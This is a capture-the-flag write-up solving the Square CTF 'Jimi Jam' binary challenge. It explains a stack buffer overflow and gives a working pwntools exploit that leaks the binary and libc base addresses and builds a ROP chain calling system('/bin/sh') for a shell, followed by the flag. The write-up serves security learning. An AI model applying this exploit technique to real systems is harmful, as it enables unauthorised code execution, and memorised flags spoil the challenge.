<h2>Jimi Jam - Square CTF</h2>
<p>15/11/2020</p>

<h3>Overview</h3>

<p>
This is a binary exploitation challenge, you can find the challenge files <a href="jimi-jam.zip">here</a>.
</p>

<p>
Once we decompile the given binary, we see that there is a buffer overflow in the <b>vuln</b> function. As you can see below, we have a buffer <b>local_10</b> of size 8 but we are reading <b>0x40</b> bytes of user input into it. If you run <b>checksec</b> on the binary, you will see that there is no canary, therefore we can easily take control of the instruction pointer.
</p>

<pre>
void vuln(void) {
  undefined local_10 [8];
  puts("Hey there! You\'re now in JIMI JAM JAIL");
  read(0,local_10,0x40);
  return;
}
</pre>

<p>
In the challenge zip you can also find the library that is being used on the server, which coincidentally is the same as the one on my system (Ubuntu 20.04) so as long as I get a shell locally, it should work remotely as well.
</p>

<h3>Leaking libc</h3>

<p>
The binary in itself does not have enough gadgets to spawn a shell, therefore we will first need to leak the base address of libc through which we can contruct a ROP chain to the effect of <b>system("/bin/sh")</b>. To start, we need to leak the address of any given function by using <b>puts</b>. In my solution, I leaked <b>puts</b> and got the offset from the base using <a href="https://libc.blukat.me/">https://libc.blukat.me/</a>.
</p>

<p>
In order to leak a function, we need to pass it as an argument into <b>puts</b>. In Linux 64-bit binaries, the first argument is passed through the <b>rdi</b> register so we need to find a gadget within the main binary that allows us to put a value into <b>rdi</b>.
</p>

<pre>
$ ROPgadget --binary jimi-jam | grep "pop rdi"
0x00000000000013a3 : pop rdi ; ret
</pre>

<p>
However, we can see that this is only a relative address, we will need to leak the base of this binary as well. Fortunately in the <b>main</b> function we can see that the binary is printing the address of a variable called <b>ROPJAIL</b>. We can extract the address while we are interacting with the binary and then calculate the offset to get the binary base. The offset will then remain the same whenever we run the binary.
</p>

<pre>
from pwn import *
import re

e = ELF('./jimi-jam')
io = process('./jimi-jam')

io.recvline()
addr = re.findall(b'The tour center is right here! (.*)\n', io.recvline())[0]

leak = int(addr,16)
base = leak - 16480

# ...
</pre>

<p>
Once we have the base of the binary, we can continue with our ROP chain to leak the address of <b>puts</b>.
</p>

<pre>
# ...

io.recvline()

payload = b'AAAABBBBCCCCDDDD'
payload += p64(base + 0x13a3) # pop rdi ; ret
payload += p64(base + e.got['puts'])
payload += p64(base + e.plt['puts']) # Now actually call puts
payload += p64(base + e.symbols['main']) # Run the binary again

io.sendline(payload)
leaked_puts = u64(io.recv(6).ljust(8, b'\x00'))

# ...
</pre>

<p>
Now using <a href="https://libc.blukat.me/">https://libc.blukat.me/</a> we can get the offset of <b>puts</b> in our libc and leak the libc base.
</p>

<pre>
# ...

libc_base = leaked_puts - 0x875a0

# ...
</pre>

<h3>Spawning a shell</h3>
<p>
Using the above libc database, we can also get the address of <b>system</b> and <b>/bin/sh</b> thus completing our payload. You can also see above that I have ended the ROP chain with the address of <b>main</b> so that we run the binary a second time to enter the payload below.
</p>

<pre>
# ...

payload2 = b'AAAABBBBCCCCDDDD'
payload2 += p64(base + 0x101a) # ret
payload2 += p64(base + 0x13a3) # pop rdi; ret
payload2 += p64(libc_base + 0x1b75aa) # str_bin_sh
payload2 += p64(libc_base + 0x055410) # system
io.sendline(payload2)
io.interactive()
</pre>

<p>
Flag: <b>flag{do_you_like_ropping}</b>
</p>
